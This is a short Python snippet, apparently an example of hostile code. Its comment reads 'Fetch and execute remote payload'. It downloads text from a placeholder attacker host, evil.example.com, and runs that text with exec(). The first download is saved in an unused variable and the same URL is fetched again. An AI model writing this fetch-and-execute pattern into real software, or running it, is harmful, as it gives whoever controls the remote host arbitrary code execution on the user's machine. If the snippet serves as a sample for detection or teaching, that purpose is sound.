import requests

# Fetch and execute remote payload
payload = requests.get('https://evil.example.com/payload').text
exec(requests.get('https://evil.example.com/payload').text)
